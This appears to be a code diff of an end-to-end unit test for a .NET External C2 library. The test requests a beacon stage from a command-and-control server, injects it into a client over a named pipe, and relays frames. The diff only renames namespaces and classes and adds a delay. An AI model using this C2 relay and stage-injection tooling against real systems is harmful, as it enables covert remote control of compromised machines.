@@ -4,7 +4,7 @@ using System.Threading.Tasks;
 
 using Xunit;
 
-namespace ExternalC2.UnitTests
+namespace ExternalC2.NET.UnitTests
 {
     public class EndToEndTests
     {
@@ -13,14 +13,14 @@ namespace ExternalC2.UnitTests
         [Fact]
         public async Task RelayFrames()
         {
-            var serverController = new Controller.BeaconController();
+            var serverController = new NET.Controller.SessionController();
             serverController.Configure(IPAddress.Parse(Constants.Server), Constants.Port, Constants.Block);
             await serverController.Connect();
             
             var pipeName = Guid.NewGuid().ToString();
             var stage = await serverController.RequestStage(pipeName, Base.Architecture.x64);
 
-            var clientController = new Client.BeaconController();
+            var clientController = new NET.Client.BeaconController();
             clientController.Configure(pipeName);
             clientController.InjectStage(stage);
             await clientController.Connect();
@@ -32,6 +32,8 @@ namespace ExternalC2.UnitTests
             
                 var serverFrame = await serverController.ReadFrame();
                 await clientController.WriteFrame(serverFrame);
+
+                await Task.Delay(5000);
             }
         }
     }
